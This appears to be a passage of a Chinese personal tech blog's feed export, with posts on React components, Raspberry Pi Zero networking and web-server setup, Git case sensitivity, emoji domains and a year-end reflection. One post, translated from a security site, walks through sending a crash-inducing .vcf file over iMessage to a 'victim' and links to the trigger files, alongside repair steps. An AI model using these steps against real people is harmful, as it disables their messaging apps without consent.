class="attr">name</span>=<span class="string">"John"</span> /&gt;</span></span></div><div class="line">  )</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在这种情况下，子组件会自动读取出父组件传递过来的<code>props</code>值John，并快速的渲染在页面上。</p>
<h2 id="到底谁是谁"><a href="#到底谁是谁" class="headerlink" title="到底谁是谁"></a>到底谁是谁</h2><p><code>state</code>和<code>props</code>看起来很相似，其实是完全不同的东西。</p>
<table>
<thead>
<tr>
<th>问题</th>
<th><em>props</em></th>
<th><em>state</em></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>可以从父组件得到初始值吗？</td>
<td>可以</td>
<td>可以</td>
<td></td>
</tr>
<tr>
<td>可以被父组件改变值吗？</td>
<td>可以</td>
<td>不可以</td>
<td></td>
</tr>
<tr>
<td>可以设置组件内部的初始值吗？</td>
<td>可以</td>
<td>可以</td>
<td></td>
</tr>
<tr>
<td>可以改变组件内部的初始值吗？</td>
<td>不可以</td>
<td>可以</td>
<td></td>
</tr>
<tr>
<td>可以设置子组件的初始值吗？</td>
<td>可以</td>
<td>可以</td>
<td></td>
</tr>
<tr>
<td>可以改变子组件的初始值吗？</td>
<td>可以</td>
<td>不可以</td>
</tr>
</tbody>
</table>
<p>按照我的个人理解，<code>props</code>是静态的，存入不变量，比如 购物车里的 商品名称、价格；<code>state</code>是动态的，存入随时变化的量，比如 用户购买商品的总价，购买数目。</p>
<p>从操作的角度上讲，<code>props</code>是单向传递的，会一直被传递到子组件，而<code>state</code>更倾向于自身，只能改变自身的值。</p>
<h1 id="获取Dom"><a href="#获取Dom" class="headerlink" title="获取Dom"></a>获取Dom</h1><p><code>this.refs</code>是react的重要组成之一，通过该方法可以快速高效的获取Dom。</p>
<p>例如，在JSX代码中这样写道<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">ref</span>=<span class="string">"myInput"</span> /&gt;</span></div></pre></td></tr></table></figure></p>
<p>便可以通过<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.refs.myInput.value</div></pre></td></tr></table></figure></p>
<p>命令获取该Input下的dom属性的value值，非常方便。</p>
<h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><p>组件都是有生命周期的，生命周期内，<code>props</code>和<code>state</code>改变会导致React自动用Diff算法重新渲染页面。那么生命周期到底都有哪些呢？</p>
<p>大体上分为三类：</p>
<ul>
<li>挂载： 组件被插入到DOM中。</li>
<li>更新： 组件被重新渲染，查明DOM是否应该刷新。</li>
<li>移除： 组件从DOM中移除。</li>
</ul>
<p>从流程上讲，是这样的：</p>
<p><strong>挂载期：</strong></p>
<p>getInitialState() –&gt;&gt; componentWillMount() –&gt;&gt; render() –&gt;&gt; componentDidMount()</p>
<p><strong>更新期：</strong></p>
<p>componentWillReceiveProps() –&gt;&gt; shouldComponentUpdate() –&gt;&gt; componentWillUpdate render() –&gt;&gt; componentDidUpdate()</p>
<p><strong>移除期：</strong></p>
<p>componentWillUnmount()</p>
<h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p><strong>componentWillMount()</strong>： 在初次渲染之前执行一次，最早的执行点</p>
<p><strong>componentDidMount()</strong>： 在初次渲染之后执行，比较常用，比如持续执行某事件：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">componentDidMount()&#123;</div><div class="line"> setInterval(<span class="keyword">this</span>.loadData(<span class="keyword">this</span>.state.date),<span class="number">1000</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><strong>componentWillReceiveProps()</strong>： 在组件接收到新的 <code>props</code> 的时候调用。在初始化渲染的时候，该方法不会调用。</p>
<p><strong>shouldComponentUpdate()</strong>： 在接收到新的 <code>props</code> 或者 <code>state</code>，将要渲染之前调用。</p>
<p><strong>componentWillUpdate()</strong>： 在接收到新的 props 或者 state 之前立刻调用。</p>
<p><strong>componentDidUpdate()</strong>： 在组件的更新已经同步到 DOM 中之后立刻被调用。</p>
<h2 id="移除"><a href="#移除" class="headerlink" title="移除"></a>移除</h2><p><strong>componentWillUnmount()</strong>： 在组件从 DOM 中移除的时候立刻被调用。</p>
<h1 id="Flux"><a href="#Flux" class="headerlink" title="Flux"></a>Flux</h1><p>React是MVC中V的一部分，而Flux则是M和C的部分，Flux是单向数据流，符合React的核心思想，不过，Flux并不完善，是一个很松散的架构。</p>
<ul>
<li>Dispatcher： 处理动作分发，维护 Store 之间的依赖关系</li>
<li>Store： 数据和逻辑部分</li>
<li>View： React 组件，这一层可以看作 controller-views，作为视图同时响应用户交互</li>
<li>Action： 提供给 Dispatcher 传递数据给 Store</li>
</ul>
<p><img src="/content/images/react/3.png" alt=""></p>
<h1 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h1><p><img src="/content/images/react/5.jpeg" alt=""></p>
<p>Flux把总架构都搭好了，可是实现起来并不容易，因为Flux并没有强大的API，只是一种纯粹的思想实现，而Redux是Flux的“升级版”，把各个部分更加方便的实现起来。</p>
<p>此部分未完待续</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我觉得React给前端开发带来了一种全新的思想，那就是以JS为中心，一种全新的世界。</p>
<p>网页不再是网页，而是像工程一样，一块块搭建起来的，拆下来，搬上去都很容易，似的前端再也不是那个凌乱拼凑的年代。</p>
<p>我想任何一种编程语言，无论是解释性、脚本、编译语言都逃离不了这个全新的年代，就是组件化，大家似乎都在不同方向发展，但实际上，确实一样的。</p>
<h1 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h1><p><a href="http://www.infoq.com/cn/articles/react-dom-diff" target="_blank" rel="external">深入浅出React（四）：虚拟DOM Diff算法解析</a></p>
<p><a href="http://bbs.reactnative.cn/topic/15/react-react-native-%E7%9A%84es5-es6%E5%86%99%E6%B3%95%E5%AF%B9%E7%85%A7%E8%A1%A8/2" target="_blank" rel="external">React/React Native 的ES5 ES6写法对照表</a></p>
<p><a href="https://www.cllgeek.com/archives/544" target="_blank" rel="external">React组件声明周期过程说明</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前两天，用React把 之前的 &lt;a href=&quot;https://github.com/yfgeek/rpi-TempRuntime&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;基于树莓派3B,DHT11/DHT22,LCD1602的一个实时温度湿度检测
    
    </summary>
    
      <category term="Web" scheme="http://blog.yfgeek.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>用Raspberry Pi Zero打造“即插即用”的Web服务器</title>
    <link href="http://blog.yfgeek.com/2017/01/12/network-zero-web/"/>
    <id>http://blog.yfgeek.com/2017/01/12/network-zero-web/</id>
    <published>2017-01-12T02:04:44.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？</p>
<p><img src="/content/images/zeroweb/0.jpg" alt=""></p>
<p>何为即插即用？</p>
<p>类似于优盘一样，插上电脑，等待几秒，直接识别为网卡，直接输入树莓派的网址，连接就是自己的网站。</p>
<p>有什么用？</p>
<p>实现本地web本地化，随着前端、后端技术的发展，web应用越来越多，但是web应用受制于网络的限制，一旦没有网络，就没有用武之地。</p>
<p>那么为什么不把web本地化呢？以后拿着“即插即用”的服务器，到任何电脑上，都能随时办公。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>我们可以把树莓派虚拟为网卡，然后在内网连接它。</p>
<p>1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">diskutil list</div><div class="line">diskutil unmountDisk /dev/SD卡的标号 <span class="comment">#如disk2</span></div><div class="line"><span class="built_in">cd</span> /Users/ivan/Downloads/2016-11-25-raspbian-jessie <span class="comment">#进入目录</span></div><div class="line">sudo dd bs=1m <span class="keyword">if</span>=2016-11-25-raspbian-jessie.img of=/dev/rdisk2</div></pre></td></tr></table></figure>
<p>2.刷好系统后编辑<code>config.txt</code>文件，在最后一行下，另起一行添加：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>
<p>保存文件</p>
<p>3.最后，打开<code>cmdline.txt</code>文件。<br>找到单词<code>rootwait</code>，在其之后添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure>
<p>4.添加一个文件名为<code>ssh</code>到根目录下，内容为空</p>
<p>5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。</p>
<p><img src="/content/images/raspizero/1.png" alt=""></p>
<p>6.Ping 一下raspberrypi.local看是否能通</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PING raspberrypi.local (169.254.70.245): 56 data bytes</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms</div></pre></td></tr></table></figure>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>1.ssh连接raspberrypi.local，默认密码为raspberry<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pi@raspberrypi.local</div></pre></td></tr></table></figure></p>
<p>2.通过直接运行<code>raspi-config</code>命令</p>
<p>你需要做</p>
<ul>
<li>容量扩展</li>
<li>更改系统时区</li>
<li>更改系统密码</li>
</ul>
<p>3.同时你需要通过执行<code>sudo passwd root</code>更改root密码</p>
<p>4.在本机设置代理</p>
<p>首先，设置本机名为Mac，在本机搭建一个squid，为了使树莓派安装web server，以后日常使用不需要。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">brew update</div><div class="line">brew install squid</div></pre></td></tr></table></figure>
<p>5.然后下载<a href="http://squidman.net/squidman/" target="_blank" rel="external">SquidMan</a>，安装。<br>在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。</p>
<p>6.进入树莓派的shell，输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /etc/apt/apt.conf.d</div><div class="line">sudo vi 50raspi</div></pre></td></tr></table></figure></p>
<p>最后一行加入一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Acquire::http::Proxy &quot;http://Mac.local:8080&quot;;</div></pre></td></tr></table></figure></p>
<p>保存</p>
<p>7.继续输入<code>apt-get update</code>查看是否有网络。</p>
<p>8.安装<code>lighthttpd+mysql+php</code></p>
<p>输入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install lighttpd mysql-server php5-cgi php5-mysql</div></pre></td></tr></table></figure>
<p>等待安装完毕后，修改<code>php.ini</code>设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo nano /etc/php5/cgi/php.ini</div></pre></td></tr></table></figure>
<p>去掉这一条注释的<code>;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;cgi.fix_pathinfo = 1</div></pre></td></tr></table></figure></p>
<p>随后修改<code>lighttpd.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo nano /etc/lighttpd/lighttpd.conf</div></pre></td></tr></table></figure></p>
<p>在<code>server.modules</code>中增加<code>fastcgi</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">server.modules = (</div><div class="line">&quot;mod_access&quot;,</div><div class="line">&quot;mod_alias&quot;,</div><div class="line">&quot;mod_compress&quot;,</div><div class="line"># &quot;mod_redirect&quot;,</div><div class="line">&quot;mod_fastcgi&quot;,</div><div class="line"># &quot;mod_rewrite&quot;,</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>最后添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">fastcgi.server = ( &quot;.php&quot; =&gt; ((</div><div class="line">    &quot;bin-path&quot; =&gt; &quot;/usr/bin/php5-cgi&quot;,</div><div class="line">    &quot;socket&quot; =&gt; &quot;/tmp/php.socket&quot;</div><div class="line">)))</div></pre></td></tr></table></figure></p>
<p>重启lighttpd服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/lighttpd restart</div></pre></td></tr></table></figure></p>
<p>通过scp协议，上传一个<code>index.php</code>文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">phpinfo();</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>删除默认的<code>index.htm</code>文件，打开网站<code>http://自己树莓派名字.local</code><br>查看是否成功。</p>
<p><img src="/content/images/zeroweb/1.png" alt=""></p>
<p>不错，接下来的事情，就是把自己的源代码传到树莓派上，不过多叙述。</p>
<h1 id="多说一句"><a href="#多说一句" class="headerlink" title="多说一句"></a>多说一句</h1><p>从此以后，你只需要带上你的树莓派Zero就可以随时随地的打开自己的私有web服务。但是，树莓派Zero的性能，确实不行，建议跑一跑小型的程序，不要跑太大的程序。</p>
<p><img src="/content/images/zeroweb/2.png" alt=""></p>
<p>至于应用嘛，其实做什么都可以的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/content/images
    
    </summary>
    
      <category term="Rasberry" scheme="http://blog.yfgeek.com/categories/Rasberry/"/>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>Git 文件、文件夹区分大小写</title>
    <link href="http://blog.yfgeek.com/2017/01/07/gitcase/"/>
    <id>http://blog.yfgeek.com/2017/01/07/gitcase/</id>
    <published>2017-01-07T02:25:32.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。</p>
<p>这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。</p>
<p>开启Git区分大小写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config core.ignorecase false</div></pre></td></tr></table></figure>
<p>最近爱上了给别人找bug，Pull Request，❤️Github。</p>
<p>任何细节，都很重要。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。&lt;/p&gt;
&lt;p&gt;这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。&lt;/p&gt;
&lt;p&gt;开启Git区分大小
    
    </summary>
    
      <category term="Github" scheme="http://blog.yfgeek.com/categories/Github/"/>
    
    
      <category term="Github" scheme="http://blog.yfgeek.com/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>iOS 10 iMessage字符崩溃Bug又来了</title>
    <link href="http://blog.yfgeek.com/2017/01/02/iOS-10-iMessage%E5%AD%97%E7%AC%A6%E5%B4%A9%E6%BA%83Bug%E5%8F%88%E6%9D%A5%E4%BA%86/"/>
    <id>http://blog.yfgeek.com/2017/01/02/iOS-10-iMessage字符崩溃Bug又来了/</id>
    <published>2017-01-02T03:49:54.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇本人发表到Freebuf的文章。</p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2通用的iMessage字符崩溃Bug，该Bug同样利用了和当年iOS 8的iMessage短信Bug的类似手法，将一段恶意代码发送给受害者，受害者在接收短信后，浏览短信即可中招，此后短信应用陷入死机状态，除非打开修复网页程序，否则再也无法打开短信应用。</p>
<p><img src="http://image.3001.net/images/20170102/14833282151664.png!small" alt="1.png"></p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>1. 下载利用文件 <a href="http://vincedes3.com/vincedes3.vcf" target="_blank" rel="external">点击这里下载</a></p>
<p>2. 把它传到 iCloud Drive, 百度云, 或者任何你能够在iPhone上下载到的地方</p>
<p>3. 打开这个文件，点击分享，再点击 短信图标</p>
<p>4. 通过iMessage把这个文件传给你的受害者好友</p>
<p>5. 等待受害者点开短信，他会中招的</p>
<p>6. 可以通过这个链接来修复 <a href="http://vincedes3.com/save.html" target="_blank" rel="external">点我修复</a></p>
<embed src="http://player.youku.com/player.php/sid/XMTg5NTI3ODE2NA==/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">

<p><a href="http://v.youku.com/v_show/id_XMTg5NTI3ODE2NA==.html#paction" target="_blank" rel="external">demo视频</a></p>
<h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>在受害者打开短信的时候，触发了大量能够引起短信程序崩溃的字符，当用户浏览该短信的时候，cpu进行了大量的计算直到短信app点不动。当用户关掉短信程序后，再次打开短信程序，系统试图加载上一次内容，依然会触发该bug。</p>
<p><img src="http://image.3001.net/images/20170102/14833289116916.jpg!small" alt="2.jpg"></p>
<p>TXT版本的触发代码: <a href="http://www.example.com" target="_blank" rel="external">http://vincedes3.com/crashtext.txt</a></p>
<p>HTML版本的触发代码: <a href="http://vincedes3.com/crashtext.html" target="_blank" rel="external">http://vincedes3.com/crashtext.html</a></p>
<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>1. 把这个链接发给受害者手机 <a href="http://vincedes3.com/save.html" target="_blank" rel="external">点我修复</a></p>
<p>2. 该链接会触发短信的快捷链接，点击打开</p>
<p>3. 进入发送短信页面</p>
<p>4. 点击取消</p>
<p>5. 删掉发送者的短信即可解决bug，请勿再次尝试点入</p>
<p>本文翻译自：<a href="https://vincedes3.com/crash-message-app-iphone/" target="_blank" rel="external">https://vincedes3.com/crash-message-app-iphone/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一篇本人发表到Freebuf的文章。&lt;/p&gt;
&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>2016，2017</title>
    <link href="http://blog.yfgeek.com/2016/12/31/2017/"/>
    <id>http://blog.yfgeek.com/2016/12/31/2017/</id>
    <published>2016-12-31T14:51:23.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。</p>
<p>每年这个时候，都会自觉地打开cnbeta.com看每一年的<a href="http://www.cnbeta.com/articles/572451.htm" target="_blank" rel="external">新年祝福</a>。今年，也不例外，这么一看，已经9年过去了。</p>
<h1 id="2016"><a href="#2016" class="headerlink" title="2016"></a>2016</h1><p>在2016年，这一年励志在Github上取得更大的成就，知乎上娱乐为主。</p>
<p>截止2016年12月31日，知乎累计收获了1388个赞，获得 252 次感谢，209 次收藏。</p>
<p>Github获得Star总数88个，607次代码贡献次数，702个粉丝。</p>
<p>同时，2016年是忙碌的一年，是纠结的一年，是辛苦的一年。在这一年里，顺利的通过了雅思考试，在这一年里顺利的本科毕业，在这一年里励志转行计算机。</p>
<p>在这一年里，好朋友各奔东西，都有了自己的发展方向与人生目标，而我却还在迷茫之中。</p>
<h1 id="2017"><a href="#2017" class="headerlink" title="2017"></a>2017</h1><p>2017年是关键的一年，决定着人生发展方向，人生充满机遇，未来的事情，谁说的好呢？</p>
<p>我不去想，</p>
<p>是否能够成功 ，</p>
<p>既然选择了远方 ，</p>
<p>便只顾风雨兼程。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。&lt;/p&gt;
&lt;p&gt;每年这个时候，都会自觉地打开cnbeta.com看每一年的&lt;a href=&quot;http://www.cnbeta.com/articles
    
    </summary>
    
      <category term="心情" scheme="http://blog.yfgeek.com/categories/%E5%BF%83%E6%83%85/"/>
    
    
      <category term="心情" scheme="http://blog.yfgeek.com/tags/%E5%BF%83%E6%83%85/"/>
    
  </entry>
  
  <entry>
    <title>Emoji 表情域名 引领未来</title>
    <link href="http://blog.yfgeek.com/2016/12/27/emoji/"/>
    <id>http://blog.yfgeek.com/2016/12/27/emoji/</id>
    <published>2016-12-27T03:37:27.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂</p>
<p><img src="/content/images/emoji/1.jpg" alt=""></p>
<p>Emoji 等 Unicode 字符，浏览器Punycode的方式将 Unicode字符用ASCII进行编码。</p>
<p>我也顺势跟风，注册了一个坑爹的TK域名。</p>
<p><a href="http://💌.tk" target="_blank" rel="external">💌.tk</a></p>
<p><img src="/content/images/emoji/emoji.jpg" alt=""></p>
<h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><p>在chrome浏览器上直接输入[想要注册的表情].com</p>
<p>按下回车键，chrome浏览器会自动帮你转换为ASCII编码方式的格式。</p>
<p>💌.tk</p>
<p>转换为：</p>
<p><a href="http://xn--rr8h.tk/" target="_blank" rel="external">http://xn--rr8h.tk/</a></p>
<h1 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h1><p>拿着自己的域名转换后的字符，比如xn–rr8h，去Godaddy或者别的域名网站直接搜就好啦。</p>
<p>注意：</p>
<p>.com域名目前无法注册任何包含emoji表情字符的域名，尚未开发，一旦开放，又是一笔巨大的商机。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://🌶️🐔.ws" target="_blank" rel="external">🐔.ws</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/content/images/emoji/1
    
    </summary>
    
      <category term="Web" scheme="http://blog.yfgeek.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Raspberry Pi Zero联网奇妙记</title>
    <link href="http://blog.yfgeek.com/2016/12/21/network-zero/"/>
    <id>http://blog.yfgeek.com/2016/12/21/network-zero/</id>
    <published>2016-12-21T23:01:26.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>说句实话，Zero真的不适合把玩，想让他连上网，太难了。</p>
<h1 id="痛点"><a href="#痛点" class="headerlink" title="痛点"></a>痛点</h1><ul>
<li>住公寓，有WiFi/Lan登录认证系统</li>
<li>公寓的网络动态分配范围很大，很难快速找到树莓派的IP</li>
<li>公寓的网络防止扫描端口，有惩罚策略</li>
<li>没有显示器 无法查看树莓派Zero的状态</li>
<li>树莓派Zero只有一个OTG USB接口</li>
<li>树莓派Zero没有内置以太网Lan</li>
<li>树莓派Zero没有无线网卡WiFi</li>
<li>树莓派Zero没有蓝牙 更没有蓝牙局域网</li>
<li>树莓派Zero除了核心部分 一无所有</li>
</ul>
<h1 id="已有装备"><a href="#已有装备" class="headerlink" title="已有装备"></a>已有装备</h1><ul>
<li>树莓派Zero</li>
<li>USB HUB 分线器</li>
<li>USB 以太网网卡</li>
<li>USB WIFI (芯片 8188EU)</li>
<li>路由器</li>
<li>网线一根</li>
<li>MacBook Pro一台</li>
</ul>
<h1 id="已有环境"><a href="#已有环境" class="headerlink" title="已有环境"></a>已有环境</h1><ul>
<li>Raspbian系统</li>
<li>vncserver</li>
</ul>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p><img src="/content/images/zeronet/0.png" alt=""></p>
<p>其中 USB HUB USB网卡 临时路由器 PC 是临时之用 配置一旦完成 抛弃这些设备直接插上WiFi自动联网。</p>
<p><img src="/content/images/zeronet/1.jpg" alt=""></p>
<h2 id="去掉之前的USB网卡模式"><a href="#去掉之前的USB网卡模式" class="headerlink" title="去掉之前的USB网卡模式"></a>去掉之前的USB网卡模式</h2><p>把sd卡取出，插入电脑</p>
<p>在<code>config.txt</code>下删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>
<p>在<code>cmdline.txt</code>下删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure></p>
<h2 id="安装WiFi驱动"><a href="#安装WiFi驱动" class="headerlink" title="安装WiFi驱动"></a>安装WiFi驱动</h2><p>之前遇到过很多坑，比如别的内核的WiFi驱动。</p>
<p>首先手动下载</p>
<p><a href="https://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz" target="_blank" rel="external">https://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz</a></p>
<p>检查无线适配器版本，同时传到树莓派上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">pi@zero:~ $ sudo ./install-wifi</div><div class="line"></div><div class="line">Your current kernel revision = 4.4.34+</div><div class="line">Your current kernel build    = <span class="comment">#930</span></div><div class="line"></div><div class="line">Checking <span class="keyword">for</span> a wifi module to determine the driver to install.</div><div class="line"></div><div class="line">Your wifi module is Bus 001 Device 003: ID 0bda:8179 Realtek Semiconductor Corp.</div><div class="line"></div><div class="line">And it uses the 8188eu driver.</div><div class="line"></div><div class="line">Checking <span class="keyword">for</span> a new 8188eu wifi driver module <span class="keyword">for</span> your current kernel.</div><div class="line">The script cannot access Dropbox to check a driver is available.</div></pre></td></tr></table></figure>
<p>手动下载<br><a href="https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz" target="_blank" rel="external">https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz</a></p>
<p>切换WiFi到树莓派网络<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp 8188eu-4.4.34-930.tar.gz pi@zero.local:~</div></pre></td></tr></table></figure></p>
